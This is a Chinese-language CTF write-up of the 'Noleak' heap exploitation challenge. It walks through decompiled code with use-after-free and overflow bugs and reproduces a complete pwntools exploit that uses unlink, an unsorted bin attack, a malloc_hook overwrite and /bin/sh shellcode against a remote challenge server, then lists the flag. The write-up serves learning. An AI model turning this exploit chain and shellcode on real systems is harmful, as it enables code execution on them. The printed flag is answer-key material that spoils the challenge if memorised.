# Noleak

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=4a421c9f-35f2-4d5c-942b-3ef4ae997845_2)

这题看了三个小时都没会。罢了，我还有时间保持菜的状态。

-   Arch:     amd64-64-little
    <br>RELRO:    Full RELRO
    <br>Stack:    Canary found
    <br>NX:       NX disabled
    <br>PIE:      No PIE (0x400000)
    <br>RWX:      Has RWX segments

曾经的我对RELRO爱搭不理，现在的我直接高攀不起。简单的堆题都是靠改got表搞事情，不知道这道题能怎么搞呢？

```c
void Main(void)
{
  int iVar1;
  do {
    while( true ) {
      while( true ) {
        PrintMenu();
        iVar1 = GetInput();
        if (iVar1 != 2) break;
        Delete();
      }
      if (2 < iVar1) break;
      if (iVar1 == 1) {
        Create();
      }
      else {
LAB_00400a0c:
        PrintSth("Wrong choice\n",0xd);
      }
    }
    if (iVar1 != 3) {
      if (iVar1 == 4) {
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      goto LAB_00400a0c;
    }
    Update();
  } while( true );
}
```

准备就要有菜单ptsd了，至今没有独立做出来一道菜单题。按顺序看。

```c
void Delete(void)
{
  uint uVar1;
  PrintSth("Index: ",7);
  uVar1 = GetInput();
  if (uVar1 < 10) {
    free(*(void **)(&DAT_00601040 + (ulong)uVar1 * 8));
  }
  return;
}
```

你别说漏洞还挺明显的，我都能一眼看出来。free后没有置null，uaf警告。继续看能和什么配合。

```c
void Create(void)
{
  uint uVar1;
  void *__buf;
  int i;
  PrintSth("Size: ",6);
  uVar1 = GetInput();
  __buf = malloc((long)(int)uVar1);
  if (__buf != (void *)0x0) {
    i = 0;
    while ((i < 10 && (*(long *)(&DAT_00601040 + (long)i * 8) != 0))) {
      i = i + 1;
    }
    if (i == 10) {
      PrintSth("List is Full!\n",0xe);
      free(__buf);
    }
    else {
      PrintSth("Data: ",6);
      read(0,__buf,(ulong)uVar1);
      *(void **)(&DAT_00601040 + (long)i * 8) = __buf;
    }
  }
  return;
}
```

这种结构的分配不是第一次遇到了，经验告诉我DAT_00601040中装着指向各个堆块的指针，再根据下面的判断可以得知不能创建超过10个堆块。

```c
void Update(void)
{
  uint uVar1;
  uint uVar2;
  PrintSth("Index: ",7);
  uVar1 = GetInput();
  if ((uVar1 < 10) && (*(long *)(&DAT_00601040 + (ulong)uVar1 * 8) != 0)) {
    PrintSth("Size: ",6);
    uVar2 = GetInput();
    PrintSth("Data: ",6);
    read(0,*(void **)(&DAT_00601040 + (ulong)uVar1 * 8),(ulong)uVar2);
  }
  return;
}
```

更新堆块里的内容。但是好像没有限制大小啊，这不会溢出吗？简直一箩筐的bug，可惜我还是不会利用。Full RELRO直接把我看懵了，所以要学习新的劫持办法：劫持malloc_hook。继续先把[exp](https://www.freesion.com/article/3386496214/)放出来（以后先把exp放出来的题目都是我学不会的）

```python
from pwn import *
def add(size, content):
	r.recvuntil("Your choice :")
	r.sendline('1')
	r.recvuntil("Size: ")
	r.sendline(size)
	r.recvuntil("Data: ")
	r.send(content)
def delete(index):
	r.recvuntil("Your choice :")
	r.sendline('2')
	r.recvuntil("Index: ")
	r.sendline(index)
def edit(index, size, content):
	r.recvuntil("Your choice :")
	r.sendline('3')
	r.recvuntil("Index: ")
	r.sendline(index)
	r.recvuntil("Size: ")
	r.sendline(size)
	r.recvuntil("Data: ")
	r.send(content)
r = remote("61.147.171.105", 63583)
malloc_hook = 3951376
bss = 0x601020
buf = 0x601040
#	chunk 0 
add(str(0x90), 'a\n')
#	chunk 1
add(str(0x90), 'b\n')
#	fake chunk
#	pre_size, size
payload = p64(0) + p64(0x91) 
#	fd, bk  
payload += p64(buf - 0x18) + p64(buf - 0x10)  
payload += p64(0) * 14
#	change chunk size of 1
payload += p64(0x90) + p64(0xa0)  
edit('0', str(len(payload)), payload)
delete('1')
payload = p64(0) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)
#	change buf[0] pointer to bss, buf[1] to buf
edit('0', str(len(payload)), payload) 
#	chunk 2
add(str(0x100), 'c\n')
#	chunk 3
add(str(0x100), 'd\n')
delete('2')
payload = p64(0) + p64(buf + 0x8 * 4)
edit('2', str(len(payload)), payload)
#	chunk 4, addr is the same with chunk2
add(str(0x100), 'e\n')
payload = p64(bss) + p64(buf) + p64(0) * 4 + b'\x10'
edit('1', str(len(payload)), payload)
shellcode = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
edit('0', str(len(shellcode)), shellcode)
#	change malloc hook
edit('6', '8', p64(bss))
r.recvuntil("Your choice :")
r.sendline('1')
r.recvuntil("Size: ")
r.sendline('1')
r.interactive()
```

malloc_hook的地址是可以直接用pwntools获取到的。

```python
libc=ELF("libc")
print(libc.symbols["__malloc_hook"])
```

malloc_hook默认为null，但如果被设置成了某个函数，那么调用malloc的时候实际调用的就是malloc_hook里的内容。结合保护没开nx和pie，有想法了吗？比如在栈上构建shellcode，然后把malloc_hook的地址设置成shellcode的地址之类的？目前都还非常好理解。

buf的地址就是前面提到的DAT_00601040，理解成一个数组也是可以的。首先创建两个chunk，分别为chunk0和chunk1。由于更新内容没有做防御，因此可以简单溢出。是时候直面unlink了。我们在chunk0中伪造一个chunk，这个chunk在chunk0的data部分，因此可以理解成chunk0包着假chunk，两者套娃关系。payload += p64(buf - 0x18) + p64(buf - 0x10) 这段构造假chunk的fd和bk，完全可以理解为公式了，unlink成功后的效果是使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18。

1.修改 fd 为 ptr - 0x18<br>
2.修改 bk 为 ptr - 0x10<br>
3.触发 unlink

曾经是可以任意地址写的，现在只能把ptr改成ptr-0x18的位置了。也比没用好。payload += p64(0) * 14理解为栈溢出中的填充物，接下来payload += p64(0x90) + p64(0xa0)就溢出到了下一个chunk也就是chunk1的pre_size和size了。unlink标准操作。delete('1')释放chunk1，触发unlink。这一套操作下来我们就把buf[0]指向了buf[0]-0x18也就是buf[-3]的位置了。继续edit chunk0的内容就是在edit buf[-3]位置上的内容。

payload = p64(0) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)中p64(0) * 3是填充物，帮助输入的内容回到buf[0]。p64(bss)正式成为buf[0]的内容，p64(0) * 3 + p64(0x20)中p64(0) * 3往后分别对应buf[1],buf[2],buf[3]等。

接下来我就不懂了。我们继续添加chunk2和chunk3，然后delete释放chunk2。chunk2回到了unsorted bin。但是edit chunk2的内容为p64(0) + p64(buf + 0x8 * 4)怎么就让之前在buf中伪造的chunk也进入了unsorted bin呢？我知道在chunk2 free后再编辑chunk2其实是在编辑chunk2的fd等字段，但是怎么就把伪造的chunk放进unsorted bin呢？我连续问了两次因为我真的看不懂啊？

接下来更疑惑了，如果说上一步我是有一半不懂，这一步我是从头到尾都不懂。add申请一个和chunk2一样大小的堆块，所以新申请的chunk4指针和chunk2一样。结果unsorted bin中就只剩下伪造的chunk，所以main arena+0x88的地址就被留在了buf[6]了吗？这都什么和什么啊，我的基础已经差到连补充知识都不知道去哪里搜了。伪造的chunk怎么进去的先不管，main arena+0x88怎么蹦出来的？buf[6]啥时候提到的？

查了一下可能是[unsorted bin attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/)的相关知识。在unsorted bin的循环双向链表中，必有一个节点的 fd 指针会指向 main_arena 结构体内部。这个节点某种意义上可以理解为尾节点。

紧接着edit chunk1，内容为p64(bss) + p64(buf) + p64(0) * 4 + b'\x10'。这个\x10会将buf[6]的末尾几个字节改成\x10，也就是malloc_hook与main arena+0x88唯一的区别。可以在给的libc中的malloc_trim()函数中找到。

最后几步就是放shellcode，写shellcode地址，改malloc_hook，然后添加一个新的chunk触发malloc从而getshell。找个时间学一下堆攻击，完全不会咋办啊？

- ### Flag
  > cyberpeace{56cc6eb86839c64bc6dcf6f22b65c8ac}